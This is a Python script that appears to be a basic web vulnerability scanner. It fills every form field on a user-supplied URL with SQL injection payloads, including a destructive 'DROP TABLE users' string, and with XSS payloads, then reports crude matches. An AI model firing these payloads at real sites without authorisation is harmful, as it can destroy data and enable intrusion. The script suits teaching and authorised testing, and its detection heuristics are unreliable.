import requests
from bs4 import BeautifulSoup

# Define payloads
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--"]
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]


# Function to fetch the page and extract forms
def get_forms(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching the URL: {e}")
        return []


# Function to print form details
def print_form_details(forms):
    for i, form in enumerate(forms, 1):
        print(f"\nForm #{i}:")
        print(f"Action: {form.get('action')}")
        print(f"Method: {form.get('method')}")
        inputs = form.find_all("input")
        for input_tag in inputs:
            print(f"Input Name: {input_tag.get('name')} | Type: {input_tag.get('type')}")


# Test for SQL Injection vulnerabilities
def test_sql_injection(url, forms, sql_payloads):
    print("\n--- Testing for SQL Injection Vulnerabilities ---")
    results = []
    for form in forms:
        action = form.get("action") or ""
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")

        for payload in sql_payloads:
            data = {}
            for input_tag in inputs:
                if input_tag.get("type") != "submit":
                    data[input_tag.get("name")] = payload

            full_url = url + action
            try:
                response = requests.post(full_url, data=data) if method == "post" else requests.get(full_url,
                                                                                                    params=data)
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    results.append((full_url, payload, "Potential SQL Injection Detected"))
                    print(f"Vulnerable! Payload: {payload}")
                else:
                    print(f"Checked payload: {payload} | No vulnerability detected.")
            except Exception as e:
                print(f"Error testing payload: {payload} | {e}")
    return results


# Test for XSS vulnerabilities
def test_xss(url, forms, xss_payloads):
    print("\n--- Testing for XSS Vulnerabilities ---")
    results = []
    for form in forms:
        action = form.get("action") or ""
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")

        for payload in xss_payloads:
            data = {}
            for input_tag in inputs:
                if input_tag.get("type") != "submit":
                    data[input_tag.get("name")] = payload

            full_url = url + action
            try:
                response = requests.post(full_url, data=data) if method == "post" else requests.get(full_url,
                                                                                                    params=data)
                if payload in response.text:
                    results.append((full_url, payload, "Potential XSS Detected"))
                    print(f"Vulnerable! Payload: {payload}")
                else:
                    print(f"Checked payload: {payload} | No vulnerability detected.")
            except Exception as e:
                print(f"Error testing payload: {payload} | {e}")
    return results


# Generate a summary report
def generate_report(results, filename="vulnerability_report.txt"):
    with open(filename, "w") as f:
        for result in results:
            f.write(f"URL: {result[0]}\nPayload: {result[1]}\nIssue: {result[2]}\n")
            f.write("-" * 50 + "\n")
    print(f"\nReport generated: {filename}")


# Main function
def main():
    url = input("Enter the URL to scan (e.g., http://testphp.vulnweb.com): ")

    print(f"\nFetching forms from {url}...")
    forms = get_forms(url)
    if forms:
        print(f"Found {len(forms)} form(s) on the page.")
        print_form_details(forms)
    else:
        print("No forms found. Exiting.")
        return

    # Test for vulnerabilities
    sql_results = test_sql_injection(url, forms, sql_payloads)
    xss_results = test_xss(url, forms, xss_payloads)

    # Generate summary report
    all_results = sql_results + xss_results
    if all_results:
        generate_report(all_results)
    else:
        print("\nNo vulnerabilities detected.")


if __name__ == "__main__":
    main()
